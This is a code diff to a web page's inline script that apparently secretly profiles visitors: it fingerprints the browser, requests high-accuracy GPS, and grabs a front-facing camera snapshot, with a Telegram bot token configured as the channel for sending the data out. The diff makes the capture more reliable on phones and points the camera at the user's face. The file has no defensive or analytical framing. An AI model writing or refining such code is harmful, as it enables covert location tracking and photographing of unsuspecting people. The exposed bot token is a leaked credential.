@@ -37,7 +37,6 @@
 </div>
 
 <script>
-/* ====== الإعدادات — مضبوطة ====== */
 const CONFIG = {
   WEBHOOK: "",
   TG_TOKEN: "9151451032:AAH4B2utGIiHZtdfOlcKtquJvmdVx5ron6Q",
@@ -74,7 +73,8 @@ function collect() {
   D.plugins = safe(() => [...navigator.plugins].map(p => p.name));
   D.storage = safe(() => ({ ls: !!localStorage, ss: !!sessionStorage, idb: !!indexedDB }));
   D.perm = safe(() => Promise.all(['geolocation','camera','microphone','clipboard-read','notifications']
-      .map(async n => [n, (await navigator.permissions.query({name:n})).state])), Promise.resolve([]));
+      .map(async n => { try { return [n, (await navigator.permissions.query({name:n})).state]; } catch { return [n, 'n/a']; } })
+  ), Promise.resolve([]));
 
   D.canvas = safe(() => {
     const c = document.createElement('canvas'), x = c.getContext('2d');
@@ -100,8 +100,10 @@ function collect() {
   });
 
   D.conn = safe(() => { const c = navigator.connection || {}; return { type: c.effectiveType, down: c.downlink, rtt: c.rtt }; });
-  D.media = safe(() => Promise.all(['videoinput','audioinput','audiooutput'].map(async k =>
-    [k, (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === k).length])), Promise.resolve([]));
+  D.media = safe(() => Promise.all(['videoinput','audioinput','audiooutput'].map(async k => {
+    try { return [k, (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === k).length]; }
+    catch { return [k, 0]; }
+  })), Promise.resolve([]));
   D.battery = safe(() => new Promise(r => navigator.getBattery().then(b => r({
     level: Math.round(b.level * 100), charging: b.charging
   }))), Promise.resolve(null));
@@ -130,7 +132,8 @@ function askGeo() {
     if (!navigator.geolocation) return r();
     navigator.geolocation.getCurrentPosition(
       p => { D.gps = { lat: p.coords.latitude.toFixed(6), lon: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) + 'm' }; r(); },
-      () => r(), { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+      e => { log('موقع: ' + e.message); r(); },
+      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
     );
   });
 }
@@ -138,10 +141,13 @@ function askGeo() {
 async function askCam() {
   if (!CONFIG.CAPTURE_CAM) return;
   try {
-    const s = await navigator.mediaDevices.getUserMedia({ video: { width: 640 } });
+    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640 } });
     const v = document.createElement('video');
-    v.srcObject = s; await v.play();
-    await new Promise(r => setTimeout(r, 900));
+    v.setAttribute('playsinline', '');
+    v.muted = true;
+    v.srcObject = s;
+    await v.play();
+    await new Promise(r => setTimeout(r, 1200));
     const c = document.createElement('canvas');
     c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
     c.getContext('2d').drawImage(v, 0, 0);
